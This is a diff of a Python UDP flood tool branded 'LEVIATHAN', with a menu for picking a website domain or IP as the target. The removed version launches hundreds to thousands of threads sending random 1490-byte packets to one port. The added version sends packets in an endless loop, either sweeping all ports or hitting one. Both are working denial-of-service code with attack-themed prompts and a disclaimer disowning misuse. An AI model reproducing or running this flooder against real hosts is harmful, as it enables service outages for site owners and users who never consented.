@@ -1,32 +1,23 @@
-"""
-╔═══════════════════════════════════════════════════════════════╗
-║   L E V I A T H A N - High Performance Network Stress Tool     ║
-║   Modified for: LEVIATHAN (2025 Edition)                      ║
-╚═══════════════════════════════════════════════════════════════╝
-"""
-
 import os
 import sys
 import time
 import socket
 import random
-import threading
 from platform import system
 
-# --- HIGH-VISUAL HIGHLIGHTED COLORS ---
-W = '\033[1;37m'  # White Bold
-G = '\033[1;32m'  # Green Bold
-R = '\033[1;31m'  # Red Bold
-Y = '\033[1;33m'  # Yellow Bold
-B = '\033[1;34m'  # Blue Bold
-C = '\033[1;36m'  # Cyan Bold
+# --- COLORS ---
+W = '\033[1;37m'  # White
+G = '\033[1;32m'  # Green
+R = '\033[1;31m'  # Red
+Y = '\033[1;33m'  # Yellow
+B = '\033[1;34m'  # Blue
+C = '\033[1;36m'  # Cyan
 RE = '\033[0m'    # Reset
 
 # Background Highlights
-HG = '\033[1;42;30m' # Highlight Green
-HR = '\033[1;41;37m' # Highlight Red
-HB = '\033[1;44;37m' # Highlight Blue
-HC = '\033[1;46;30m' # Highlight Cyan
+HG = '\033[1;42;30m' 
+HB = '\033[1;44;37m' 
+HC = '\033[1;46;30m' 
 
 def clear():
     os.system('cls' if system() == "Windows" else 'clear')
@@ -45,99 +36,88 @@ def logo():
     print(f"  {HG}  AUTHOR: LEVIATHAN  {RE}  {HB}  TEAM: LEVIATHAN  {RE}  {HC}  VER: 1.2  {RE}")
     print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}")
 
-# ---------------------------------------------------------
-# [!] WORKING PART (MULTI-THREADED ENGINE)
-# ---------------------------------------------------------
+# Socket Setup
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes_data = random._urandom(1490)
 
-sent_packets = 0
-
-def leviathan_strike(ip, port, data):
-    global sent_packets
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while True:
-        try:
-            client.sendto(data, (ip, port))
-            sent_packets += 1
-            # হাইলাইটেড আউটপুট যা একই লাইনে সংখ্যা আপডেট করবে (ল্যাগ কম হবে)
-            print(f"{G}[LEVIATHAN-STRIKE]{W} >> {R}{ip}{W} | {HG} PACKETS SENT: {sent_packets} {RE}", end="\r")
-        except:
-            pass
-
-# ---------------------------------------------------------
-
-def boot_system():
-    clear()
-    print(f"\n\n{B}[+] {W}INITIALIZING LEVIATHAN CORE ENGINE...")
-    time.sleep(1)
-    for i in range(1, 101, 5):
-        sys.stdout.write(f"\r{B}[{G}{'█' * (i // 2)}{W}{'.' * (50 - (i // 2))}{B}] {Y}{i}%")
-        sys.stdout.flush()
-        time.sleep(0.04)
-    print(f"\n\n{HG}  SUCCESS: SYSTEM READY FOR ATTACK  {RE}")
-    time.sleep(1.5)
-
-# Main Execution
-boot_system()
-
+# Main Menu Logic (ACS Style)
 while True:
     logo()
     print(f"\n {G}[01]{W} DOMAIN TARGET (Website)")
-    print(f" {G}[02]{W} IP TARGET (Server/Game)")
+    print(f" {G}[02]{W} IP TARGET (Server/Address)")
     print(f" {G}[03]{W} ABOUT LEVIATHAN")
     print(f" {R}[00]{W} EXIT TOOL")
     
-    choice = input(f"\n{C}╔═══[{G}Leviathan@Terminal{C}]\n╚══{B}> {Y}")
+    opt = input(f"\n{C}┌──({G}Leviathan@Terminal{C})\n└─> {Y}")
 
-    if choice == '1':
-        domain = input(f"\n{B}[?]{W} DOMAIN: {Y}")
+    if opt == '1':
+        domain = input(f"{B}[?]{W} Enter Domain: {Y}")
         try:
-            target_ip = socket.gethostbyname(domain)
+            ip = socket.gethostbyname(domain)
             break
         except:
-            print(f"{HR} ERROR: INVALID DOMAIN {RE}")
-            time.sleep(2)
-    elif choice == '2':
-        target_ip = input(f"\n{B}[?]{W} IP ADDRESS: {Y}")
+            print(f"{R}Invalid Domain!{RE}")
+            time.sleep(1)
+    elif opt == '2':
+        ip = input(f"{B}[?]{W} Enter IP Address: {Y}")
         break
-    elif choice == '3':
-        logo()
-        print(f"\n{HC}  INFORMATION  {RE}")
-        print(f"{W}Created by  : {G}LEVIATHAN")
-        print(f"{W}Telegram    : {C}@leviathan_official")
-        print(f"{W}Disclaimer  : {R}Team LEVIATHAN bears no responsibility for misuse.{RE}")
-        input(f"\n{Y}Press Enter to return...")
-    elif choice == '0' or choice == '00':
+    elif opt == '3':
+        print(f"\n{HG} LEVIATHAN TOOLKIT {RE}")
+        print(f"{W}Telegram: code_predator_amf (Original Author)")
+        print(f"{W}Re-Branded: LEVIATHAN")
+        input(f"\n{G}Press Enter to continue...")
+    elif opt == '0' or opt == '00':
         sys.exit()
-
-# Port & Thread Configuration
-logo()
-print(f" {HC}  ATTACK CONFIGURATION  {RE} ")
-print(f"\n{W}TARGET: {R}{target_ip}")
-port = input(f"{W}PORT (Press Enter for 80): {Y}")
-port = int(port) if port else 80
-
-threads_count = input(f"{W}THREADS (Power: 500-2000): {Y}")
-threads_count = int(threads_count) if threads_count else 800
-
-# Generating Data Payload
-payload = random._urandom(1490)
-
-# Final Strike
-print(f"\n{HR}  WARNING: ATTACK STARTING IN 3 SECONDS...  {RE}")
-time.sleep(3)
-logo()
-
-# Launching Threads (The Working Part)
-for i in range(threads_count):
-    th = threading.Thread(target=leviathan_strike, args=(target_ip, port, payload))
-    th.daemon = True
-    th.start()
-
-# Keep Main Thread Alive
-try:
-    while True:
+    else:
+        print(f"{R}Invalid Choice!{RE}")
         time.sleep(1)
-except KeyboardInterrupt:
-    print(f"\n\n{HR}  ATTACK TERMINATED BY USER  {RE}")
-    print(f"{HC} TOTAL PACKETS SHOT: {sent_packets} {RE}")
-    sys.exit()
+
+# Port Selection Logic (ACS Style Flow)
+port_mode = False
+port = 2
+
+logo()
+print(f"\n{W}TARGET IP: {G}{ip}")
+port_bool = input(f"{C}Certain port? [y/n]: {Y}").lower()
+
+if port_bool == "y":
+    port_mode = True
+    port = int(input(f"{B}[?]{W} Enter Port: {Y}"))
+else:
+    port_mode = False
+
+# Initializing Animation
+logo()
+print(f'\n{HC} INITIALIZING LEVIATHAN SYSTEM.... {RE}')
+time.sleep(1)
+print(f'{G}CONNECTING TO CORE....')
+time.sleep(2)
+print(f'{Y}STARTING ATTACK FLOW....')
+time.sleep(1)
+
+sent = 0
+
+# --- THE WORKING PART (Attack Flow) ---
+if not port_mode:
+    try:
+        while True:
+            if port >= 65534:
+                port = 1
+            elif port == 1900:
+                port = 1901
+            
+            sock.sendto(bytes_data, (ip, port))
+            sent += 1
+            port += 1
+            # ACS স্টাইল স্ক্রলিং আউটপুট
+            print(f"\033[1;32m[LEVIATHAN-STRIKE] Sent {sent} packets to {ip} through port: {port}")
+    except KeyboardInterrupt:
+        print(f'\n{R}Stopped by User{RE}')
+else:
+    try:
+        while True:
+            sock.sendto(bytes_data, (ip, port))
+            sent += 1
+            print(f"\033[1;32m[LEVIATHAN-STRIKE] Sent {sent} packets to {ip} through port: {port}")
+    except KeyboardInterrupt:
+        print(f'\n{R}Stopped by User{RE}')
